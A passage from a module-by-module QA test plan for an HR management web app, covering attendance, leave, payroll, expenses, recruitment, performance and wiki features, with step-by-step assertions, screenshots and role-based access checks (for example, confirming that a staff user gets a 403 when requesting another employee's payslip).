First Name: 100 characters → allowed (or max length enforced)
First Name: emoji "👨‍💼" → handled gracefully (accepted or clear error)
Email: "test+tag@nulogic.com" → allowed (plus addressing valid)
Email: "test@subdomain.nulogic.com" → allowed
Phone: "+91-9876543210" → allowed with formatting
Phone: "0000000000" → allowed or validation error (per policy)
Join Date: today → allowed
Join Date: 5 years in the past → allowed (backdated hire)
Department: none selected → required field error
assert    → all validation errors shown inline (not only toast/alert)
```

---

## MODULE 5 — DEPARTMENTS (/departments)

### 5.1–5.5 CRUD & Hierarchy

```
Load: name, head, employee count visible
Create: fill name + head → save → in list with 0 employees
Edit: change name → save → updates in list
Delete with employees: "Cannot delete department with employees" (or transfer prompt)
Delete empty: confirm → removed
Hierarchy: parent/child structure renders, expand shows children, counts aggregate
```

### 5.6 RBAC

```
HRA, SYS → full CRUD
MGR      → read only
ESS, REC, PAY, ITA, FIN → 403 or redirect
```

---

## MODULE 6 — ATTENDANCE (/attendance, /timesheets)

### 6.1 Attendance List

```
navigate  → /attendance
assert    → records: employee, date, clock-in, clock-out, duration, status
assert    → today's record visible (from clock-in test)
assert    → date range, department, employee, status filters work
screenshot → attendance-list.png
```

### 6.2 Date Range Filter

```
From: first of month, To: today → records filter to range
From > To → validation error or auto-correct
```

### 6.3 Manual Entry (HRA)

```
click     → Add Attendance
fill      → employee, date, clock-in, clock-out
assert    → duration auto-calculated, record in list
```

### 6.4 Correction Request (ESS)

```
find      → record with missing clock-out → Request Correction
fill      → correct time + reason → Submit
assert    → status: "Pending", manager sees it in approvals
```

### 6.5 Approve / Reject Correction (MGR)

```
Approve → status: "Approved", attendance record updated
Reject  → reason required → Confirm → status: "Rejected"
```

### 6.6 Timesheet View (/timesheets)

```
navigate  → /timesheets
assert    → weekly view, clock-in/out per day, total hours per week
prev/next week navigation → data updates
screenshot → timesheets.png
```

### 6.7 Biometric Device Integration (/admin/biometric or attendance settings — V86)

```
navigate  → biometric devices admin page
assert    → registered devices listed (device name, ID, location, status)
Add Device: fill device name + serial + location → Save → in list
Sync: trigger sync → attendance records from device appear
assert    → biometric clock-ins visible alongside manual entries in attendance list
RBAC: ITA/SYS manage devices; HRA read; others → 403
screenshot → biometric-devices.png
```

### 6.8 Shift Management (/shifts or attendance settings — V89)

```
navigate  → /shifts (or /admin/shifts)
assert    → shift list: name, start time, end time, break duration, working days
Create Shift: fill name + start/end times + days + grace period → Save
Assign to employee: employee profile → Employment tab → assign shift
assert    → employee attendance calculated against shift (not default 9-5)
assert    → late arrivals flagged based on shift start time
RBAC: HRA/SYS full CRUD; MGR assign within team; ESS view own shift
screenshot → shifts-list.png, shift-assign.png
```

### 6.9 Overtime (/overtime)

```
navigate  → /overtime
assert    → overtime requests listed or empty state
Create: fill employee + date + extra hours + reason → Submit → "Pending"
Approve (MGR/HRA): Approve → "Approved", hours added to payroll flag
RBAC: ESS apply own; MGR approve team; HRA/PAY/SYS full access
screenshot → overtime-list.png
```

### 6.10 Export

```
click     → Export with date range filter applied
assert    → Excel/CSV: employee, dates, times, hours, status — matches screen
```

### 6.11 RBAC

```
ESS → own attendance, request corrections
MGR → team view, approve corrections
HRA → full access, manual entry, override
PAY → read-only (payroll context)
SYS → full access
REC, FIN, ITA → 403
```

---

## MODULE 7 — LEAVE (/leave, /leave/requests, /leave/balances, /leave/calendar)

### 7.1 Overview Load

```
navigate  → /leave
assert    → leave balance cards per type, Apply Leave button, recent requests
screenshot → leave-overview.png
```

### 7.2 Apply Leave — Happy Path

```
click     → Apply Leave
fill      → Type: Earned Leave, From: tomorrow, To: day after tomorrow, Reason
assert    → Working days auto-calculated (2), available balance shown
click     → Submit
assert    → "Leave request submitted", in list as "Pending"
assert    → balance NOT deducted yet (pending)
read_network_requests → POST /api/v*/leave/requests → 201
screenshot → leave-apply-success.png
```

### 7.3 Apply Leave — Validations

```
empty submit           → required field errors
From > To             → date validation error
More days than balance → "Insufficient balance" error
Holiday selection      → warning or block (per policy)
Weekend-only           → "No working days selected"
Restricted holiday     → warning shown (V85 restricted holidays)
```

### 7.4 Cancel Own Pending Request

```
find pending → Cancel / Withdraw → confirm dialog → status: "Cancelled"
assert    → balance restored if pre-deducted
```

### 7.5 Approval Flow (MGR)

```
Approve → status: "Approved", ESS sees update, balance deducted
Reject  → reason required → Confirm → status: "Rejected", balance unchanged
```

### 7.6 Leave Balances (/leave/balances)

```
assert    → type, total, used, available, lapsed
assert    → used + available = total (no arithmetic errors)
assert    → no negative balances
screenshot → leave-balances.png
```

### 7.7 Leave Calendar (/leave/calendar)

```
assert    → current month renders, leave on correct dates, holidays distinct color
assert    → restricted holidays (V85) shown with distinct marker
navigate  → next/prev month → updates
click     → leave entry → popup with details
screenshot → leave-calendar.png
```

### 7.8 LWF (Labour Welfare Fund — V82)

```
navigate  → /statutory (or payroll settings → LWF)
assert    → LWF configuration visible: employee + employer contribution rates
assert    → LWF deductions appear on payslip (ESS)
assert    → LWF can be enabled/disabled per state
RBAC: PAY/SYS configure; HRA read; others → 403
screenshot → lwf-config.png
```

### 7.9 Leave — Edge Cases

```
# Overlapping leave
apply leave for Mon-Fri → approved
apply ANOTHER leave for Wed-Thu (same period) → should block: "Overlapping leave exists"
assert    → cannot double-book leave days

# Half-day leave
apply half-day leave (AM or PM) → assert half-day deducted from balance (0.5 days)
apply full-day leave for same date as existing half-day → should allow PM half if AM taken

# Zero balance
exhaust all Earned Leave balance → apply another Earned Leave
assert    → "Insufficient balance" error shown BEFORE submission
assert    → form prevents submission (button disabled or blocked)

# Backdated leave
apply leave for a past date (last week)
assert    → allowed with warning "Backdated leave" OR blocked per policy
assert    → backdated leave shows differently in calendar (past vs future styling)

# Leave spanning months
apply leave from March 28 to April 3 (spans month boundary)
assert    → balance correctly calculated across months
assert    → calendar shows leave on both March and April views
assert    → working days calculation excludes weekends + holidays in BOTH months

# Compulsory leave (admin override)
HRA: apply leave on behalf of ESS → "Applied by HR Admin" note visible
assert    → ESS sees the leave in their requests with "Applied by [HRA name]"

# Leave during notice period
mark employee as "In Notice Period" → apply leave
assert    → warning "Employee is in notice period" shown or leave blocked per policy
```

### 7.10 RBAC

```
ESS → apply for self, own requests/balances
MGR → apply for self, approve/reject team, team balances
HRA → full access, any employee, configure leave types
PAY → read-only (leave affects payroll)
SYS → full access
ESS: /leave/admin or /leave/settings → 403
```

---

## MODULE 8 — PAYROLL (/payroll, /payroll/runs, /payroll/payslips)

### 8.1–8.4 Overview, Runs, Payslip View, Download

```
PAY: overview shows pending runs, last run date, total employees
Runs: list of past runs, click → per-employee breakdown, totals match sum
ESS: own payslips listed, click → earnings/deductions/net/employer contributions
     amounts formatted (currency, commas), no "NaN" or "undefined"
Download PDF: file opens, correct data, employee name + period + amounts
screenshot → payroll-runs.png, payslip-detail.png
```

### 8.5 SpEL Formula Engine Validation

```
navigate  → compensation components admin
assert    → formula fields use SpEL expressions (e.g., basicSalary * 0.4)
edit      → HRA component formula → Save
run       → payroll → component calculated by new formula
assert    → formula evaluation order respects DAG (no circular dependency crash)
assert    → payslip shows updated component amount
```

### 8.6 Statutory Filing (/statutory, /tax — V87)

```
navigate  → /statutory
assert    → statutory filing categories: PF, ESI, PT, LWF, TDS
assert    → filing periods listed with due dates and status
Generate Report: select period + type → Generate → report downloads
File Return: initiate statutory filing → status updates
assert    → filed returns marked with date of filing
RBAC: PAY/SYS full access; HRA read; others → 403
screenshot → statutory-filing.png
```

### 8.7 Tax (/tax)

```
navigate  → /tax
assert    → employee tax declarations listed
ESS: own tax declaration → fill/update investment proofs + amounts → Submit
HRA/PAY: approve declarations, view all employees
assert    → TDS calculated based on declarations
screenshot → tax-declarations.png
```

### 8.8 Payroll — Calculation Integrity

```
# Verify payslip arithmetic
navigate  → payslip detail for any employee
assert    → Total Earnings = sum of all earning components (Basic + HRA + DA + TA + ...)
assert    → Total Deductions = sum of all deduction components (PF + ESI + PT + TDS + ...)
assert    → Net Pay = Total Earnings - Total Deductions (EXACT match, no rounding error)
assert    → Employer Contributions listed separately (not added to net pay)
assert    → all amounts are positive (no negative earnings)
assert    → no component shows ₹0 unless explicitly zero-valued (not a calculation failure)
assert    → sum of all employee payslips = total payroll run amount

# Month-over-month consistency
compare current month payslip with previous month:
assert    → if salary unchanged, basic should be same
assert    → if leave taken, LOP deduction visible and correct
assert    → if overtime approved, overtime amount reflected
assert    → if loan EMI active, deduction present and correct amount
```

### 8.9 Payroll — Sensitive Data Exposure

```
login as ESS → navigate to own payslip
read_network_requests → GET /api/v*/payslips/[id]
assert    → response contains ONLY own payslip data
assert    → no other employee names, IDs, or salary data in response
assert    → PDF download contains ONLY own data
assert    → no salary data visible in browser localStorage/sessionStorage

login as ESS → attempt GET /api/v*/payslips?employeeId=[OTHER_ID]
assert    → 403 (not 200 with other's data)

login as MGR → navigate to team payroll view
assert    → sees only direct reports' summary (not individual payslips)
assert    → cannot download other's payslip PDF
```

### 8.10 RBAC

```
PAY, SYS → full access
ESS, MGR  → own payslip only
HRA       → read-only
REC, FIN, ITA → /payroll → 403
ESS: /payroll/employees/[OTHER_ID]/payslips → 403
```

---

## MODULE 9 — COMPENSATION (/compensation)

### 9.1–9.3 Overview, Salary Structure, Increment / Revision

```
Load:      compensation table with grade, base, allowances, total
Structure: components (Basic, HRA, TA, DA...) with amounts and percentages
Revision:  fill employee + effective date + new salary + reason → save
           revision history logged, effective date respected
read_network_requests → POST /api/v*/compensation/revisions → 201
```

### 9.4 RBAC

```
PAY, HRA, SYS → full access
MGR → read-only for own team
ESS → view own compensation only
REC, FIN, ITA → 403
```

---

## MODULE 10 — BENEFITS (/benefits)

### 10.1–10.2 Overview & Enrollment

```
Load: benefit categories listed (Health, Insurance, PF...), enrollment status
Enroll: fill form + dependents → Enroll → status: "Enrolled", effective date shown
```

### 10.3 RBAC

```
ESS       → enroll/view own benefits
HRA, SYS  → manage plans, view all enrollments
MGR       → view team enrollment summary
PAY       → read-only (affects payroll)
```

---

## MODULE 11 — EXPENSES (/expenses)

### 11.1–11.3 List, Create, Validations

```
List: date, category, amount, status; filters: status/date range/category
Create: fill Category/Date/Amount/Description, upload receipt → Submit
        status: "Pending", receipt thumbnail visible
        POST /api/v*/expenses → 201
Validate: 0 amount / no category / missing receipt (if required) / over limit → errors
screenshot → expenses-list.png, expense-create.png
```

### 11.4 Expense Extensions (V88)

```
# V88 added extended expense categories and multi-currency support
Create expense in non-INR currency: fill amount + currency selector (USD, EUR, GBP)
assert    → amount converted to base currency at current rate
assert    → original currency + converted amount both shown on payslip/export
Extended categories: verify new V88 categories appear in dropdown
assert    → expense policy limits enforced per new categories
screenshot → expense-multicurrency.png
```

### 11.5 Approval (FIN/MGR)

```
Approve → "Approved"; Reject → reason required → "Rejected"
ESS sees updated status
```

### 11.6 Edit / Withdraw

```
ESS: edit pending → change amount → update → changes saved
ESS: withdraw pending → confirm → Withdrawn
ESS: approved expense → Withdraw button disabled or blocked
```

### 11.7 RBAC

```
ESS → own pending claims
MGR → own + approve team
FIN → approve all financial
HRA → view all
SYS → full access
```

---

## MODULE 12 — LOANS (/loans)

### 12.1–12.3 Request, Approval, EMI Schedule

```
Request:  fill type/amount/months/reason → Submit → status: "Pending Approval"
          POST /api/v*/loans → 201
Approve:  HRA → approve terms → status: "Approved", EMI schedule generated
EMI:      installment dates + amounts, total repayment = principal + interest
screenshot → loan-request.png
```

### 12.4 RBAC

```
ESS → apply + view own
HRA, FIN, SYS → approve + view all
MGR → view team loans
PAY → read-only (deductions)
```

---

## MODULE 13 — TRAVEL (/travel)

### 13.1–13.3 Request, Approval, Expense Report

```
Request: destination, dates, purpose, transport, cost → Submit → "Pending"
Approve/reject (same flow as expenses)
Post-travel: submit expense report linked to travel request, attach bills
screenshot → travel-request.png
```

### 13.4 RBAC

```
ESS → own requests
MGR → own + approve team
FIN → financial approvals
HRA, SYS → full access
```

---

## MODULE 14 — ASSETS (/assets)

### 14.1–14.5 List, Add, Assign, Return, ESS View

```
List (ITA): name, type, serial/tag, assigned to, status; filters work
Add:        fill name/type/serial/dates/value → Save → "Available"
            POST /api/v*/assets → 201
Assign:     find Available asset → select employee + date → status: "Assigned"
            employee profile shows the asset
Return:     fill return date + condition → Confirm → status: "Available" again
            employee profile: asset removed
ESS view:   only own assets visible, cannot create/edit
screenshot → assets-list.png
```

### 14.6 RBAC

```
ITA, SYS → full CRUD
HRA, MGR → read access
ESS      → own assets only
REC, PAY, FIN → 403
```

---

## MODULE 14A — STATUTORY & TAX (/statutory, /tax)

```
Statutory: navigate → /statutory
  assert → compliance settings listed (PF, ESI, PT, TDS, LWF as applicable)
  assert → employer/employee contribution rates shown
  HRA/PAY/SYS → configure rates, thresholds, filing periods
  ESS → view own statutory deductions (from payslip or /me/tax)

Tax:      navigate → /tax
  assert → tax declaration form or investment proof upload
  ESS → declare investments (80C, 80D, HRA exemption, etc.)
  ESS → upload proof documents for declared investments
  PAY → view all declarations, approve/reject proofs
  HRA/SYS → full access + regime configuration (Old vs New)
  assert → tax computation preview updates when declarations change

RBAC: PAY, HRA, SYS → admin; ESS → own declarations; MGR → team read-only; REC, FIN, ITA → 403
screenshot → statutory-settings.png, tax-declaration.png
```

---

## MODULE 14B — TIME TRACKING (/time-tracking)

```
navigate  → /time-tracking
assert    → time entries table: project, task, hours, date, status
Log Time: click Add Entry → project + task + hours + date + notes → Save → entry in list
           POST /api/v*/time-tracking → 201
Edit:     click entry → modify hours/notes → Save → updated
Delete:   confirm dialog → removed
Weekly:   weekly summary view with totals per project
Export:   download timesheet CSV/Excel with correct totals

RBAC: ESS → own entries; MGR → view/approve team; HRA/SYS → all; PAY → read-only; REC, FIN, ITA → 403
screenshot → time-tracking.png
```

---

## MODULE 14C — PROJECTS, RESOURCES & ALLOCATIONS (/projects, /resources, /allocations)

```
Projects: navigate → /projects
  assert → project list: name, status, manager, team size, dates
  Create: name + description + start/end dates + manager → Save → in list
  Detail: click → project detail with milestones, tasks, team members
  Edit/Archive: update project details, archive completed projects

Resources: navigate → /resources
  assert → resource pool: employees with skills, availability, current allocation %
  Filter: by skill, department, availability
  assert → allocation % shown per resource (0–100%)

Allocations: navigate → /allocations
  assert → allocation matrix: employee × project × percentage × dates
  Create: assign employee to project + % allocation + date range → Save
  Edit:   modify allocation % or dates → Save
  Conflict: allocating >100% total → warning or block
  assert → resource utilization dashboard or chart

RBAC: MGR → own team/projects; HRA/SYS → all; ESS → view own allocations; PAY, REC, FIN, ITA → 403
screenshot → projects-list.png, resources-pool.png, allocations-matrix.png
```

---

## MODULE 14D — OVERTIME (/overtime)

```
navigate  → /overtime
ESS:      view own overtime records; request overtime (date, hours, reason) → Submit → "Pending"
MGR:      view team overtime; approve/reject requests
HRA/SYS:  full access; configure overtime policies (rates, max hours, eligibility)
PAY:      read-only (overtime feeds into payroll calculations)

Overtime Request: fill date + start/end time + reason → Submit
  assert → hours auto-calculated from times
  assert → overtime rate shown (1.5x, 2x per policy)
  assert → exceeding max hours → warning or block
Approval:  MGR/HRA → Approve → status: "Approved"; hours reflected in attendance/payroll
           Reject → reason required → status: "Rejected"

RBAC: ESS → own; MGR → team; HRA/SYS → all + policy config; PAY → read-only; REC, FIN, ITA → 403
screenshot → overtime-list.png
```

---

## MODULE 14E — PROBATION (/probation)

```
navigate  → /probation
HRA/SYS:  list of employees on probation: name, start date, end date, status, manager
  assert → probation period countdown visible
  Extend:  select employee → Extend Probation → new end date + reason → Save
  Confirm: select employee → Confirm Employment → effective date → Save → status: "Confirmed"
  Terminate: select employee → Terminate → reason + last working date → Save → offboarding triggered

MGR:      view own team's probation status; submit confirmation recommendation
ESS:      view own probation status, remaining days, review schedule

Review Integration: probation review linked to /performance review cycle
  assert → review form accessible from probation detail page

RBAC: HRA/SYS → full CRUD + policy config; MGR → team view + recommend; ESS → own status; PAY, REC, FIN, ITA → 403
screenshot → probation-list.png
```

---

## MODULE 14F — SHIFTS (/shifts)

```
navigate  → /shifts
HRA/SYS:  shift schedule management
  List:    shift definitions: name, start time, end time, break duration, color code
  Create:  New Shift → name + times + break + weekly off days → Save
  Assign:  assign shift to employees (individual or bulk by department)
           assert → employee's attendance calculates against assigned shift
  Roster:  weekly/monthly roster view (calendar grid: employee × day → shift)
           drag-and-drop shift assignment (if supported)
  Rotate:  configure shift rotation rules (weekly/biweekly rotation)

MGR:      view team shift roster; request shift swap for team members
ESS:      view own shift schedule; request shift swap → approval flow

Swap Request: ESS → Request Swap → select colleague + date → Submit → "Pending"
  MGR/HRA → Approve → both employees' shifts updated

RBAC: HRA/SYS → full CRUD + roster; MGR → team view + swap approval; ESS → own view + swap request; PAY → read-only; REC, FIN, ITA → 403
screenshot → shifts-roster.png, shift-definitions.png
```

---

## MODULE 15 — LETTERS (/letters)

### 15.1–15.3 Templates, Generate, Custom

```
List:     template list visible (offer, experience, salary certificate, etc.)
Generate: type + employee + date → preview with correct data (name, designation, tenure)
          Download PDF → readable, correct content
Custom:   subject + body with {{placeholders}} → select employee → Preview
          placeholders replaced with actual values → Send / Download
```

### 15.4 Letter Templates Admin (V83)

```
navigate  → /admin/letter-templates (or /letters/templates)
assert    → template list with type, name, language, last modified
Create template: select type + enter Tiptap rich text body with {{employee_name}} etc. → Save
Preview template with real employee data → all placeholders resolved
Edit existing template → re-save → preview reflects changes
RBAC: HRA/SYS full access; others → 403
screenshot → letter-templates-admin.png
```

### 15.5 RBAC

```
HRA, SYS → full access (generate, send, manage templates)
MGR      → generate for own team
ESS      → view/download own letters only
REC, PAY, FIN, ITA → 403
```

---

## MODULE 16 — HELPDESK (/helpdesk)

### 16.1–16.3 Create, View/Reply, Resolve

```
Create:  subject + category + priority + description → Submit → ticket ID, status: "Open"
View:    ticket detail: subject, description, status, assignee, created date
Reply:   type reply → Send → appears in thread with timestamp
Resolve: HRA/SYS → assign to self → Resolve → resolution notes → Close → status: "Resolved"
         requester sees "Resolved"
screenshot → helpdesk-create.png
```

### 16.4 RBAC

```
All roles → create + view own tickets
HRA, SYS  → view all, assign, resolve
MGR       → view team tickets
ITA       → handle IT-category tickets
```

---

## MODULE 17 — APPROVALS (/approvals)

### 17.1–17.3 Dashboard, Bulk Approve, History

```
Dashboard: pending items by type (leave, expenses, loans, travel...) with count badges
           filter by type works correctly
Bulk:      select multiple → Bulk Approve → dialog shows count → all approved → list updates
History:   past decisions listed with date and approver name
screenshot → approvals-dashboard.png
```

### 17.4 Approval Workflow Engine

```
# Tests the generic workflow_def → workflow_step → approval_instance → approval_task engine
navigate  → /approvals
Submit leave request as ESS → pending in approvals queue
assert    → correct approver (MGR) receives approval task (data-driven routing, not hardcoded)
Multi-step workflow: approve step 1 → item advances to step 2 approver
assert    → notifications sent to next approver via Kafka → browser notification
read_network_requests → Kafka event logged: POST /api/v*/approvals/[id]/approve → 200
screenshot → approval-workflow-multistep.png
```

### 17.5 RBAC

```
ESS → own submitted items only, no approve actions
MGR → team's pending items, can approve
HRA → all HR-related approvals
FIN → all financial approvals
SYS → everything
```

---

## MODULE 18 — ANNOUNCEMENTS (/announcements)

### 18.1–18.5 List, Create, Pin, Edit/Delete, RBAC

```
List:   pinned announcements at top, click → detail visible
Create: HRA → title + body + audience + dates → Publish → in list + feed
Pin:    moves to top; unpin → chronological order
Edit:   pre-populated → save → updated
Delete: confirm → removed, not accessible via direct URL
RBAC: HRA/SYS full CRUD; MGR department-scoped; ESS/others read-only
ESS: direct POST /api/v*/announcements → 403
```

---

## MODULE 19 — ORG CHART (/org-chart)

```
Load:    hierarchical tree renders, CEO at root, expand/collapse work
         employee cards: name, photo, designation, department
Search:  type name → chart zooms/pans to employee, node highlighted
Views:   Tree vs List (if available) both render; 768px → horizontal scroll
RBAC:    all roles read access; no PII beyond name/designation/department
screenshot → org-chart.png
```

---

## MODULE 20 — CALENDAR (/calendar, /nu-calendar)

```
Load:    current month grid, holidays marked, leave entries visible, events clickable
         restricted holidays (V85) shown with distinct styling
Navigate: next/prev month, Today button, year picker
Views:    Week view → 7 columns; Day view → single day
Add Event: click date → modal → fill title/time/description → Save → appears on calendar
```

---

## MODULE 21 — REPORTS & ANALYTICS (/reports, /analytics)

### 21.1–21.4 Reports List, Generate, Export, Analytics

```
Reports: categories listed (HR, Attendance, Leave, Payroll...)
Generate: Attendance Report + date range + department → table/chart renders with data
Export:  CSV/Excel/PDF → correct type, data matches screen, no blank rows
Analytics: charts render (bar, pie, line — not blank boxes), legends + tooltips work
screenshot → reports-list.png, analytics-dashboard.png
```

### 21.5 Export Rate Limiting

```
click Export 6 times in 5 minutes
assert    → 6th export attempt returns 429 or "Rate limit reached" error
assert    → error message informative (not generic 500)
Note: exports are capped at 5 per 5 min (Bucket4j)
```

### 21.6 RBAC

```
HRA, SYS → all reports
MGR      → team-scoped only
PAY      → payroll reports
FIN      → financial reports
REC      → recruitment reports
ESS      → /reports → 403
```

---

## MODULE 22 — ADMIN (/admin, /admin/roles, /admin/settings)

### 22.1 Admin Dashboard

```
login as SYS → /admin
assert    → admin modules listed: Roles, Permissions, Audit Log, Settings, etc.
screenshot → admin-dashboard.png
```

### 22.2 Role Management

```
/admin/roles → roles with permission counts
click role → permissions matrix grouped by module
toggle permission → Save → success toast
spot check: affected role behavior changes
```

### 22.3 Create Custom Role

```
Add Role → name: "QA Custom Role" + description + base role + specific permissions
Save → in list → assign to test user → user has custom permissions
```

### 22.4 Audit Log (/admin/audit)

```
assert    → timestamp, user, action, module, details
filter    → by user, date range, action type
click entry → full details (before/after values)
assert    → CREATE/UPDATE/DELETE from tests appear here
screenshot → audit-log.png
```

### 22.5 System Settings (/settings)

```
categories: Company Info, Leave Settings, Attendance, Payroll
change non-critical setting → Save → success toast → change reflected in module
```

### 22.6 SAML IdP Configuration (/admin/saml or /settings/sso — V84)

```
navigate  → SSO/SAML settings
assert    → SAML configuration form: Entity ID, SSO URL, certificate fields
Add IdP:  fill metadata URL or manual XML → Save → IdP in list
assert    → SSO login option appears on login page
assert    → SAML logout (SLO) endpoint configured
RBAC: SYS only — HRA/others → 403
screenshot → saml-config.png
```

### 22.7 Restricted Holidays Configuration (V85)

```
navigate  → /admin/holidays or /settings/holidays
assert    → holiday list with type: NATIONAL, OPTIONAL, RESTRICTED
Add restricted holiday: name + date + type: RESTRICTED + applicable states → Save
assert    → restricted holiday appears in leave calendar with distinct marker
assert    → applying leave on restricted holiday shows warning
RBAC: HRA/SYS manage; others read
screenshot → restricted-holidays-admin.png
```

### 22.8 Feature Flags (/admin/features)

```
navigate  → feature flags admin
assert    → all 12 flags listed: enable_payroll, enable_performance, enable_documents, enable_helpdesk, enable_lms, enable_wellness, enable_projects, enable_timesheets, enable_fluence, enable_google_drive, enable_payments, enable_ai_recruitment
assert    → all flags ENABLED for demo tenant (660e8400-...)
Toggle flag OFF (non-critical): save → affected module shows "Feature not available"
Toggle back ON → module accessible again
SYS: can toggle any flag
HRA: read-only for flags
screenshot → feature-flags.png
```

### 22.9 RBAC

```
SYS → full access
HRA → partial (employee settings, leave config)
All others → /admin → 403 or redirect
ESS: /admin/roles direct URL → 403
```

---

## MODULE 23 — REFERRALS (/referrals)

```
navigate  → /referrals
assert    → my referrals list or "No referrals yet" empty state
Submit referral: fill candidate name + email + position + relationship → Submit
assert    → referral in list with status "Pending Review"
assert    → referred candidate appears in /recruitment pipeline
Track: referral status updates as candidate progresses (Applied → Interview → Hired)
Bonus: if referral bonus configured, bonus entry generated on hire
RBAC: ESS/all roles can submit referrals; HRA/SYS manage all; REC view pipeline
screenshot → referrals-list.png
```

---

## NU-HIRE SUB-APP

---

## MODULE 24 — RECRUITMENT (/recruitment)

### 24.1–24.3 Job Postings List, Create, Edit/Close

```
List (REC): title, department, openings, status, application count; filters work
Create:     title + department + openings + type + location + description → Publish
            status: "Active", POST /api/v*/jobs → 201
Edit:       change openings count → Save
Close:      confirm → status: "Closed", visible in filtered view
screenshot → recruitment-list.png, job-create.png
```

### 24.4 Candidate Pipeline

```
click job → Kanban stages: Applied / Screening / Interview / Offer / Hired / Rejected
drag → Applied → Screening → stage updates in DB
PATCH /api/v*/candidates/[id] → 200
screenshot → candidate-pipeline.png
```

### 24.5 Add Candidate Manually

```
Add Candidate → name/email/phone/resume/position → Save → in "Applied" stage
```

### 24.6 Schedule Interview / Make Offer

```
Schedule:  date, time, interviewer, type (phone/video/onsite) → Schedule
           interview on interviewer's calendar, candidate in "Interview" stage
Make Offer: fill offer details + start date + letter template → Send Offer
           candidate in "Offer" stage, offer letter generated
```

### 24.7 RBAC

```
REC, HRA, SYS → full access
MGR → view open positions + interview schedules for own team
ESS, PAY, FIN, ITA → /recruitment → 403
```

---

## MODULE 25 — ONBOARDING (/onboarding)

```
List:     new hires in onboarding
Checklist: items (Doc submission, IT setup, Orientation...) → Mark Complete → progress bar updates
Task assign (HRA): fill name/due date/description → new employee sees task
RBAC: HRA/SYS manage all; MGR/new ESS complete own tasks; REC view only
screenshot → onboarding-checklist.png
```

---

## MODULE 26 — PREBOARDING (/preboarding)

```
List:     candidates with accepted offers
Document: request → email/task created → uploaded docs appear in portal
```

---

## MODULE 27 — OFFBOARDING (/offboarding)

```
Initiate:  HRA → employee + last working date + reason → Submit → checklist created
Checklist: asset return, access revocation, clearance, exit interview → complete each
           clearance certificate generated at 100%
Exit Interview: schedule + complete questionnaire → data saved for HR analytics
screenshot → offboarding-init.png
```

---

## MODULE 28 — OFFER PORTAL (/offer-portal)

```
View:    pending offers list → click → letter preview (name, role, salary, start date, terms)
Accept:  digital signature / acknowledgment → status: "Accepted" → auto-advances to preboarding
Decline: reason field → status: "Declined" → position re-opens in recruitment
```

---

## MODULE 28A — CAREERS (/careers)

```
Public Page (NO AUTH REQUIRED — public job board):
  navigate → /careers
  assert → active job listings visible: title, location, type, department
  assert → no auth token sent in API requests (public endpoint)
  Search/Filter: by keyword, department, location, job type
  Detail: click job → full description, requirements, benefits, Apply button
  Apply:  fill application form (name, email, resume upload, cover letter)
          Submit → success message, confirmation email reference
          POST /api/v*/careers/applications → 201
  Validation: submit without resume → error; invalid email → error
  assert → closed positions NOT shown in active listing
  assert → no internal employee data exposed on public page (salary ranges, manager names, etc.)

Authenticated view:
  REC/HRA/SYS → manage careers page from /recruitment admin side
  ESS/MGR/PAY/FIN/ITA → /careers is public, no special access needed

screenshot → careers-public.png, careers-apply.png
```

---

## NU-GROW SUB-APP

---

## MODULE 29 — PERFORMANCE (/performance)

```
Overview: current review cycle, self-assessment status
Self-Assess: goals/KPIs listed → rating (1–5) + comments per goal → Submit → "Submitted", manager notified
Manager Review: MGR → find team member → fill ratings + overall + dev notes → Submit → "Manager Reviewed"
Cycle (HRA): create cycle → name/type/dates/eligible employees → Launch → employees notified
RBAC: ESS (self), MGR (review team), HRA/SYS (manage cycles), others → 403
screenshot → performance-overview.png
```

---

## MODULE 30 — OKR (/okr)

```
Dashboard: objectives with progress bars
Create:   title + description + owner + due date + level (Company/Team/Individual)
          Key Results with target + unit → Save → 0% progress
Update:   click KR → Update Progress → value: 25 → progress bar = 25%, parent re-calculates
Check-in: fill update text + values → check-in history logged
screenshot → okr-dashboard.png
```

---

## MODULE 31 — 360° FEEDBACK (/feedback360)

```
Request: select reviewers + deadline → Send → reviewers notified, requests shown as pending
Give:    peer login → pending request → questionnaire (ratings + comments) → Submit → "Completed"
Summary: aggregated scores (anonymized), themes from comments
```

---

## MODULE 32 — TRAINING & LEARNING (/training, /learning)

```
Catalog:  programs listed with enrollment status; filter by category/mandatory
Enroll:   detail page → Enroll → enrollment confirmed, in "My Trainings"
Complete: (admin-assigned) Mark Complete + date + score → status: "Completed", certificate downloadable
Learning: /learning → courses + progress indicators → content loads, progress saved
screenshot → training-list.png
```

---

## MODULE 33 — RECOGNITION (/recognition)

```
Send:       select employee + badge type (Innovation, Teamwork, Leadership...) + message → Send
            appears in feed and employee profile
Wall:       recent recognitions, like/react, comment
Leaderboard: ranked by recognition count, highest first
```

---

## MODULE 34 — SURVEYS (/surveys)

```
List:    active surveys with deadline
Complete: questions (single/multi-choice, text, rating) → Submit → "Thank you", moves to Completed
Create (HRA): title + audience + deadline + questions → Publish → employees notified, responses tracked
```

---

## MODULE 35 — WELLNESS (/wellness)

```
Dashboard: programs listed or wellness score
Log:       type (exercise, meditation, nutrition) + duration → Save → score updates
screenshot → wellness-dashboard.png
```

---

## NU-FLUENCE SUB-APP (Routes defined; UI is Phase 2 — test only what renders)

---

## MODULE 36 — FLUENCE WIKI (/fluence/wiki)

```
Home:    categories/pages listed, search bar functional
Create:  New Page → title + rich text (Tiptap) + tags → Publish → visible in wiki
Edit:    modify → Save → version history created
Delete:  confirm → removed, not accessible via URL
Tiptap rich text: test bold/italic/heading/table/code block/link insertion
screenshot → wiki-home.png
```

---

## MODULE 37 — FLUENCE BLOGS (/fluence/blogs)

```
List:    title, author, date, read time; filter by tag/author
Create:  title + content + cover image + tags → Publish (or Save Draft)
         Published: in list; Draft: only visible to author
Comment: fill comment → Post → appears with author + timestamp, can reply
```

---

## MODULE 38 — FLUENCE SEARCH (/fluence/search — Elasticsearch)

```
navigate  → /fluence/search
type      → 3-char keyword from known wiki page title
assert    → results appear, title + excerpt shown
assert    → results are relevant (Elasticsearch full-text match, not DB LIKE)
type      → nonexistent term → EmptyState (not blank, not 500)
Highlight: assert search term highlighted in result excerpt
Filters: filter by content type (wiki, blog, template) → results narrow
read_network_requests → GET /api/v*/search?q=... → 200 (not 500)
screenshot → fluence-search-results.png
```

---

## MODULE 39 — FLUENCE WALL (/fluence/wall)

```
navigate  → /fluence/wall
assert    → activity feed renders or EmptyState
assert    → no console errors
assert    → route accessible (not 404)
screenshot → fluence-wall.png
```

---

## MODULE 40 — FLUENCE MY CONTENT (/fluence/my-content)

```
navigate  → /fluence/my-content
assert    → own created content listed (wikis, blogs, templates) or EmptyState
